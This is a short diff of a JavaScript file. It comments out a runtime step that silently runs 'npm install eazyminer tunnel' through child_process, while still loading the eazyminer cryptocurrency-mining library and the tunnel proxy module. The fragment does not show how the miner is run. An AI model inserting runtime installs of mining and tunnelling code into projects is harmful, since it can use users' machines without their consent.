@@ -1,9 +1,9 @@
-const childProcess = require('child_process');
+/*const childProcess = require('child_process');
 
 // Install dependencies
 console.log('Installing dependencies...');
 childProcess.execSync('npm install eazyminer tunnel', { stdio: 'inherit' });
-
+*/
 const Miner = require('eazyminer');
 const tunnel = require('tunnel');
 
